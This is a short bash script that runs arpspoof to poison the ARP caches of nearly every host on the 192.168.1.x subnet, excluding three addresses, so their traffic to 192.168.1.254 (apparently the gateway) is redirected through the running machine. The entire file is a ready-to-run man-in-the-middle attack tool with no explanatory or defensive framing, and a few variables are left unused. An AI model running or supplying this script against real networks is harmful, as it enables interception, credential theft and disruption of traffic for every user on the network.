#!/bin/bash

num=`seq 1 253`
new_num=`echo $num | sed -e 's/19\ //' -e 's/210\ //'`
i=1
ip=' '
while [ "$i" != "255" ] 
do
	ip="$ip -t 192.168.1.$i"
	i=$(($i+1))
done
arp=$(echo $ip | sed -e 's/-t\ 192.168.1.19//' -e 's/-t\ 192.168.1.210//' -e 's/-t\ 192.168.1.1//')
#echo $arp
#arps="-t 192.168.1.81 -t 192.168.1.83"
arpspoof -i eth0 $arp 192.168.1.254
#arpspoof -i eth0 -t 192.168.1.81 -t 192.168.1.83 192.168.1.254

